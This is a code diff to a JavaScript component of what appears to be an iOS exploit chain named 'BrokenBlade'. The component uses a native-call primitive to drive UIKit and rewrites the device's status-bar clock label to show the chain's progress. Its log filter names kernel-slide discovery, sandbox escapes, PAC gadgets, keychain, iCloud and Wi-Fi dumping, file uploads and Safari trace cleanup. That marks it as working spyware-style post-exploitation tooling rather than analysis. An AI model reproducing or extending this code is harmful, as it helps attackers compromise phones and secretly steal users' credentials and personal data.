@@ -1,8 +1,8 @@
 (() => {
   const STATUS_PATH = globalThis.__bb_chain_status_path || "/private/var/tmp/brokenblade_chain_status.log";
   const COMPLETE_MARKER = globalThis.__bb_chain_status_complete_marker || "[PE] start() completed successfully";
-  const POLL_INTERVAL_US = 750000;
-  const POLL_MAX_ITERS = 7200;
+  const POLL_INTERVAL_US = 1500000;
+  const POLL_MAX_ITERS = 2400;
   const MAX_READ_BYTES = 16384;
   const MAX_LINES = 8;
   const FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|\[CHAIN-OVL\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
@@ -178,33 +178,6 @@
     return objc(NSString, "stringWithUTF8String:", str);
   }
 
-  function nsNumberLL(val) {
-    const NSNumber = Native.callSymbol("objc_getClass", "NSNumber");
-    return objc(NSNumber, "numberWithLongLong:", BigInt(val));
-  }
-
-  function nsValueFromCGRect(x, y, w, h) {
-    const mem = Native.callSymbol("malloc", 32n);
-    const buf = new ArrayBuffer(32);
-    const dv = new DataView(buf);
-    dv.setFloat64(0, x, true);
-    dv.setFloat64(8, y, true);
-    dv.setFloat64(16, w, true);
-    dv.setFloat64(24, h, true);
-    Native.write(mem, buf);
-    const typeEnc = Native.callSymbol("malloc", 64n);
-    Native.writeString(typeEnc, "{CGRect={CGPoint=dd}{CGSize=dd}}");
-    const NSValue = Native.callSymbol("objc_getClass", "NSValue");
-    const v = objc(NSValue, "valueWithBytes:objCType:", mem, typeEnc);
-    Native.callSymbol("free", mem);
-    Native.callSymbol("free", typeEnc);
-    return v;
-  }
-
-  function setFrame(obj, x, y, w, h) {
-    objc(obj, "setValue:forKey:", nsValueFromCGRect(x, y, w, h), nsStr("frame"));
-  }
-
   function log(msg) {
     try {
       const tagged = "[CHAIN-OVL] " + msg;
@@ -273,68 +246,117 @@
     for (let i = 0; i < lines.length; i++) {
       if (lines[i].indexOf(COMPLETE_MARKER) >= 0) done = true;
     }
-    const header = done ? "BrokenBlade: COMPLETE" : "BrokenBlade: chain running";
     const tail = lines.slice(lines.length > MAX_LINES ? lines.length - MAX_LINES : 0);
     globalThis.__bb_chain_overlay_done = done;
-    return header + "\n" + (tail.length ? tail.join("\n") : "waiting for " + STATUS_PATH);
+    if (done) return "BB COMPLETE: [PE] start() completed successfully";
+    if (!tail.length) return "BB waiting for chain status";
+    let tick = Number(globalThis.__bb_chain_overlay_tick || 0);
+    globalThis.__bb_chain_overlay_tick = tick + 1;
+    let line = tail[tick % tail.length];
+    line = line.replace(/^.*?(\[PE\]|\[PE-DBG\]|\[SBX1\]|\[MPD\]|\[SAFARI-CLEAN\]|\[THREEAPP\]|\[CHAIN-OVL\])/, "$1");
+    let out = "BB " + line;
+    if (out.length > 64) out = out.slice(0, 61) + "...";
+    return out;
   }
 
-  function ensureOverlay() {
-    if (isNonZero(globalThis.__bb_chain_overlay_label)) return true;
+  function resolveStatusBarClasses() {
+    return {
+      cls17: Native.callSymbol("objc_getClass", "STUIStatusBarStringView"),
+      cls16: Native.callSymbol("objc_getClass", "_UIStatusBarStringView")
+    };
+  }
+
+  function walkFindStatusBarLabels(view, cls1, cls2, out, depth, visited) {
+    if (depth > 10 || out.length >= 8) return;
+    if (!isNonZero(view)) return;
+    visited[0] = visited[0] + 1;
+    if (isNonZero(cls1) && isNonZero(objc(view, "isKindOfClass:", cls1))) {
+      out.push(view);
+      return;
+    }
+    if (isNonZero(cls2) && isNonZero(objc(view, "isKindOfClass:", cls2))) {
+      out.push(view);
+      return;
+    }
+    const subs = objc(view, "subviews");
+    if (!isNonZero(subs)) return;
+    let cnt = Number(u64(objc(subs, "count")));
+    if (cnt > 48) cnt = 48;
+    for (let i = 0; i < cnt; i++) {
+      const sub = objc(subs, "objectAtIndex:", BigInt(i));
+      walkFindStatusBarLabels(sub, cls1, cls2, out, depth + 1, visited);
+      if (out.length >= 8) break;
+    }
+  }
+
+  function findStatusBarLabel() {
+    const cached = globalThis.__bb_chain_overlay_label;
+    if (isNonZero(cached)) return cached;
     const UIApplication = Native.callSymbol("objc_getClass", "UIApplication");
-    const UIWindow = Native.callSymbol("objc_getClass", "UIWindow");
-    const UILabel = Native.callSymbol("objc_getClass", "UILabel");
-    const UIViewController = Native.callSymbol("objc_getClass", "UIViewController");
-    const UIColor = Native.callSymbol("objc_getClass", "UIColor");
-    if (!isNonZero(UIApplication) || !isNonZero(UIWindow) || !isNonZero(UILabel) || !isNonZero(UIColor)) {
-      log("missing UIKit classes");
-      return false;
+    if (!isNonZero(UIApplication)) {
+      log("UIApplication missing");
+      return 0n;
+    }
+    const classes = resolveStatusBarClasses();
+    if (!isNonZero(classes.cls17) && !isNonZero(classes.cls16)) {
+      log("status bar string classes missing");
+      return 0n;
     }
     const app = objc(UIApplication, "sharedApplication");
     if (!isNonZero(app)) {
-      log("no sharedApplication");
-      return false;
+      log("sharedApplication missing");
+      return 0n;
     }
-    const keyWindow = objc(app, "keyWindow");
-    const scene = isNonZero(keyWindow) ? objc(keyWindow, "windowScene") : 0n;
-
-    const win = objc(UIWindow, "new");
-    if (!isNonZero(win)) {
-      log("window allocation failed");
-      return false;
+    const keyWin = objc(app, "keyWindow");
+    if (!isNonZero(keyWin)) {
+      log("keyWindow missing");
+      return 0n;
     }
-    setFrame(win, 0, 28, 430, 198);
-    if (isNonZero(scene)) objc(win, "setWindowScene:", scene);
-    objc(win, "setBackgroundColor:", objc(UIColor, "clearColor"));
-    objc(win, "setUserInteractionEnabled:", 0);
-    objc(win, "setValue:forKey:", nsNumberLL(2200), nsStr("windowLevel"));
-    const vc = isNonZero(UIViewController) ? objc(UIViewController, "new") : 0n;
-    const hostView = isNonZero(vc) ? objc(vc, "view") : win;
-    if (isNonZero(vc)) objc(win, "setRootViewController:", vc);
-
-    const label = objc(UILabel, "new");
-    if (!isNonZero(label)) {
-      log("label allocation failed");
-      return false;
+    const scene = objc(keyWin, "windowScene");
+    if (!isNonZero(scene)) {
+      log("windowScene missing");
+      return 0n;
     }
-    setFrame(label, 8, 0, 414, 190);
-    objc(label, "setNumberOfLines:", 0);
-    objc(label, "setTextColor:", objc(UIColor, "greenColor"));
-    objc(label, "setBackgroundColor:", objc(UIColor, "blackColor"));
-    objc(label, "setUserInteractionEnabled:", 0);
-    objc(isNonZero(hostView) ? hostView : win, "addSubview:", label);
-    objc(win, "setHidden:", 0);
+    const sceneWins = objc(scene, "windows");
+    if (!isNonZero(sceneWins)) {
+      log("scene.windows missing");
+      return 0n;
+    }
+    let winCount = Number(u64(objc(sceneWins, "count")));
+    if (winCount > 16) winCount = 16;
+    const candidates = [];
+    const visited = [0];
+    for (let i = 0; i < winCount; i++) {
+      const win = objc(sceneWins, "objectAtIndex:", BigInt(i));
+      walkFindStatusBarLabels(win, classes.cls17, classes.cls16, candidates, 0, visited);
+      if (candidates.length >= 8) break;
+    }
+    if (!candidates.length) {
+      log("no status bar labels visited=" + visited[0]);
+      return 0n;
+    }
+    const colon = nsStr(":");
+    for (let i = 0; i < candidates.length; i++) {
+      const txt = objc(candidates[i], "text");
+      if (isNonZero(txt) && isNonZero(objc(txt, "containsString:", colon))) {
+        globalThis.__bb_chain_overlay_label = candidates[i];
+        log("using clock status label candidate=" + i);
+        return candidates[i];
+      }
+    }
+    globalThis.__bb_chain_overlay_label = candidates[0];
+    log("using status label candidate=0");
+    return candidates[0];
+  }
 
-    globalThis.__bb_chain_overlay_window = win;
-    globalThis.__bb_chain_overlay_label = label;
-    log("overlay created path=" + STATUS_PATH);
-    return true;
+  function ensureOverlay() {
+    return isNonZero(findStatusBarLabel());
   }
 
   function updateOverlay() {
-    const label = globalThis.__bb_chain_overlay_label;
-    if (!ensureOverlay() || !isNonZero(label || globalThis.__bb_chain_overlay_label)) return false;
-    const target = isNonZero(label) ? label : globalThis.__bb_chain_overlay_label;
+    if (!ensureOverlay()) return false;
+    const target = globalThis.__bb_chain_overlay_label;
+    if (!isNonZero(target)) return false;
     objc(target, "setText:", nsStr(globalThis.__bb_chain_overlay_text || "BrokenBlade: waiting"));
     return true;
   }
